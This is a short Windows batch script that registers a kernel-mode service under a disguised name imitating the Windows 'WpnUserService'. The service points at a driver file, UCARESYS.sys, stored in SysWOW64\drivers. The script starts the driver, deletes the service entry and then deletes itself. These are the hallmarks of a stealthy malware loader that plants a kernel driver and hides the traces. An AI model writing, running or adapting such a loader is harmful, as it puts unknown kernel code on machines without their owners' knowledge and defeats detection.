@echo off
cd %~dp0
sc create WpnUserService_72ad5 binpath=C:\Windows\SysWOW64\drivers\UCARESYS.sys type=kernel
sc start WpnUserService_72ad5
sc delete WpnUserService_72ad5
del "%~f0"



